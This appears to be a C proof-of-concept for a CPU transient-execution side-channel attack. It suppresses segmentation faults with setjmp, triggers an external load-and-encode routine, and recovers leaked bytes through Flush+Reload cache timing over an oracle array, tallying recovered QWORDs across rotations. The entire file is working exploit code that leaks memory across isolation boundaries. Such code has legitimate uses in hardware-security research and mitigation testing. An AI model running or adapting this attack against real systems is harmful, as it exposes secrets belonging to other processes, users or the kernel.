#include <setjmp.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "cacheutils.h"
#include "lib.h"

#define BYTE_TRY 12
#define PAGE_SIZE 4096

extern uint64_t CACHE_THRESHOLD;
extern uint8_t *oracles;
uint64_t permQ[4] = {0};

extern void s_load_encode(uint64_t *array);

void intHandler(int dummy)
{
  printf("\n");
  map_dump();
  exit(0);
}

int main(int argc, char *argv[])
{
  signal(SIGINT, intHandler);
  signal(SIGSEGV, trycatch_segfault_handler);
  signal(SIGFPE, trycatch_segfault_handler);

  // CACHE_MISS = detect_flush_reload_threshold();
  CACHE_MISS = 230;
  printf("CACHE_MISS: %lu\n", CACHE_MISS);
  map_create();

  int currentRotation = 0;    // For keeping track of what QWORD we're currently leaking
  int prevHit, currentHit;    // For keeping track of 00 - 00 hits, since we don't use strlen anymore
  int hitThisRound, iterHits; // For keeping track of if we hit this round

  while (1)
  {
    prevHit = -1;
    currentHit = -1;

    currentRotation = (currentRotation + 1) % 4;
    for (int i = 0; i < 4; i++)
    {
      permQ[i] = (currentRotation + i) % 4;
    }

    if (!setjmp(trycatch_buf))
    {
      s_load_encode(permQ);
    }
    // char *foundBytes = malloc(sizeof(char) * (BYTE_TRY * 2 + 1));
    char foundBytes[BYTE_TRY * 2 + 1];
    memset(foundBytes, 0, BYTE_TRY * 2 + 1);

    for (size_t c = 0; c < BYTE_TRY; c++)
    {
      hitThisRound = 1;
      for (size_t i = 0; i < 256; i++)
      {
        int mix_i = i;
        uint64_t time = flush_reload_t(((uint8_t *)&oracles + (mix_i + (c * 256)) * PAGE_SIZE));
        if (time < CACHE_MISS)
        {
          iterHits += 1 & hitThisRound; // Only count first hit
          hitThisRound = 0;
          currentHit = mix_i;
        }
      }
      // Byte to hex
      foundBytes[2 * c + 1] = (currentHit & 0x0f) < 10
                                  ? '0' + (currentHit & 0x0f)
                                  : (currentHit & 0x0f) - 10 + 'a';
      foundBytes[2 * c + 0] = (currentHit >> 4) < 10
                                  ? '0' + (currentHit >> 4)
                                  : (currentHit >> 4) - 10 + 'a';

      // Check for 00 - 00 bytes
      // But leave potential QWORDs with 00 at the end
      if (prevHit == 0 & currentHit == 0)
      {
        if (c >= 8) // Zero out everything after the first QWORD
          memset(foundBytes + 2 * 8, 0, (BYTE_TRY - 8) * 2 + 1);
        else // Zero out the two bytes that were 00 - 00
          memset(foundBytes + 2 * (c - 2), 0, 4);
        break;
      }
      // If we missed, zero out the byte that missed, and break
      if (currentHit == -1)
      {
        memset(foundBytes + 2 * (c - 1), 0, 2);

        break;
      }
      // Else, update variables for leaking next byte
      prevHit = currentHit;
      currentHit = -1;
    }
    // If we got a QWORD or more, put it in the right map
    if (iterHits >= 8 && strlen(foundBytes) >= 8 * 2)
    {
      map_increment(currentRotation, foundBytes);
    }
  }

  intHandler(1);
}
